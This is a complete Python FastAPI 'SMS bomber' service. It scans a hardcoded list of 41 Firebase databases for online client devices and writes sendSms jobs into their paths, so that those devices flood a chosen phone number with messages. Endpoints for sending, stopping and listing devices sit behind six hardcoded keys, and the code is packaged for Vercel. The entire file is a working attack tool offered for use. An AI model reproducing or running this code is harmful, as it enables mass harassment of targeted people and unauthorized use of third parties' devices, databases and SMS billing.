#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v7                         ║
║   ▸ API Key Protected (6 keys)                          ║
║   ▸ Full Fan-Out (har device × count)                   ║
║   ▸ /stop endpoint                                      ║
║   ▸ Flash Speed 🚄                                      ║
║   ▸ Vercel Ready                                        ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query, Header
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS — Only these 6 work
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://alwaysatiif7-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://chilgumsir-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://adani-5dd2c-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://project9-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
]

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

MAX_CONCURRENT = 150
BATCH_CHUNK = 500
REQUEST_TIMEOUT = 8

API_NAME = "@BRONX_ULTRA"
API_VERSION = "7.0"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Ultra Firebase Bomber — Key Protected"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (OPTIONAL)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
    else:
        print("⚠️ Redis not configured — /stop per-instance only")
except Exception as e:
    print(f"⚠️ Redis init skipped: {e}")
    redis = None

_LOCAL_STOP = set()

# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    """Check if API key is valid"""
    if not api_key:
        return False
    return api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    """Extract key from multiple places"""
    # 1. Header: X-API-Key
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    # 2. Authorization: Bearer xxx
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    # 3. Query param: ?key=xxx or ?api_key=xxx
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    # 4. Body: {"key": "xxx"}
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return key
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            return [
                {"id": k, "url": base}
                for k, v in data.items()
                if isinstance(v, dict) and v.get("status") is True
            ]
    except Exception:
        return []


async def get_all_devices(session):
    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payload = {
            "from": 1,
            "to": target,
            "message": message,
            "isSended": False,
            "timestamp": int(time.time() * 1000),
        }
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        stats["blocked"] += 1
                        return False
            except Exception:
                continue
        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP:
        return True
    if redis:
        try:
            val = await redis.get(f"stop:{number}")
            return val is not None
        except Exception:
            return False
    return False


# ═══════════════════════════════════════════════════════════
# 💣 FULL FAN-OUT WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass
    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=1000, limit_per_host=200, ttl_dns_cache=300
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=4)
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count
        print(f"\n{'='*55}")
        print(f"[{jid}] 🔥 {API_NAME} JOB STARTED")
        print(f"[{jid}] Key        : {api_key}")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Message    : {message[:40]}")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*55}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        processed = 0
        while processed < total:
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {processed}/{total}")
                break

            chunk_end = min(processed + BATCH_CHUNK, total)
            tasks = []
            for idx in range(processed, chunk_end):
                device = devices[(idx // count) % ndev]
                tasks.append(send_one(session, device, number, message, sem, stats))

            await asyncio.gather(*tasks, return_exceptions=True)
            processed = chunk_end

            elapsed_sf = time.time() - t0
            print(f"[{jid}] ⚡ {processed}/{total} | OK={stats['success']} | "
                  f"{elapsed_sf:.1f}s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] ✅ DONE")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
        print(f"{'='*55}\n")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "redis": "connected" if redis else "off",
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
        },
        "header_alternative": "X-API-Key: YOUR_KEY",
    }


@app.get("/health")
async def health():
    return {
        "api": API_NAME,
        "status": "ok",
        "time": datetime.now().isoformat(),
    }


@app.get("/keys")
async def keys_info():
    """Show masked keys (for user awareness)"""
    return {
        "api": API_NAME,
        "total_keys": len(VALID_KEYS),
        "hint": "Contact admin for a valid key",
        "key_format_examples": ["bronx-xxxx", "prime-xxxx", "flash-xxxx"],
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /send — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    # Parse params
    if request.method == "GET":
        query_data = dict(request.query_params)
        body_data = {}
    else:
        query_data = dict(request.query_params)
        try:
            body_data = await request.json()
        except Exception:
            try:
                body_data = dict(await request.form())
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    # 🔑 KEY CHECK
    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "🔑 API key required",
                "how_to": "Add ?key=YOUR_KEY or header X-API-Key",
            },
            status_code=401,
        )

    if not verify_key(api_key):
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "❌ Invalid API key",
                "your_key": api_key[:8] + "***" if len(api_key) > 8 else "***",
                "hint": "Contact admin for valid key",
            },
            status_code=401,
        )

    # Params
    message = merged.get("message") or merged.get("msg")
    number = merged.get("number") or merged.get("num") or merged.get("numer")
    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400
        )

    number = str(number).strip().replace("+", "").replace(" ", "").replace("-", "")
    if not number.isdigit() or len(number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400
        )

    # 🚀 Launch background job
    bg.add_task(bomb_worker, number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "key_used": api_key,
        "target": number,
        "per_device": count,
        "note": "Total SMS = (online devices) × count",
        "stop_url": f"/stop?key={api_key}&number={number}",
        "warning": "⚡ Requests are firing in background",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    key: str = Query(None),
):
    # Key from query or header
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "🔑 Valid API key required to stop",
            },
            status_code=401,
        )

    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400
        )

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)
    if redis:
        try:
            await redis.set(f"stop:{number}", "1", ex=300)
        except Exception:
            pass

    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
        "key_used": api_key,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices": devices,
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases — PUBLIC (info only)
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint():
    return {
        "api": API_NAME,
        "success": True,
        "total": len(FIREBASE_URLS),
        "firebases": FIREBASE_URLS,
    }


# Vercel handler
handler = app
